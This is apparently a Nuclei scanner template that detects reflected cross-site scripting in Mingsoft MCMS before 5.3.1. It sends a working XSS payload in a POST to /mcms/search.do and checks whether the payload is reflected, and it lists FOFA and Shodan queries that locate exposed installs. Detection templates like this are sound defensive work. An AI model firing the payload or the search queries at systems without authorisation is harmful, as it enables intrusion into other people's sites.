flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - mingsoft.net
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - '><sVg/Onload=alert`document.domain`>'
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /mcms/search.do HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    content_title=1"><sVg/Onload=alert`document.domain`></p>

    '
id: mcms-search-xss
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:mingsoft:mcms:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.6789
    epss-score: 0.00345
  description: 'A vulnerability classified as problematic has been found in Mingsoft
    MCMS up to 5.3.1. This affects an unknown part of the file search.do of the component
    HTTP POST Request Handler.

    '
  impact: 'Successful exploitation could lead to unauthorized access to sensitive
    data.

    '
  metadata:
    fofa-query: icon_hash="1464851260"
    max-request: 2
    product: mcms
    shodan-query: http.favicon.hash:1464851260
    vendor: mingsoft
  name: Mingsoft MCMS < 5.3.1 - Cross-Site Scripting
  reference:
  - https://gitee.com/mingSoft/MCMS/issues/I5MT8Y
  remediation: 'We recommend that you update to the latest version 5.4 or above.

    '
  severity: medium
  tags: mingsoft,mcms,xss,vuln
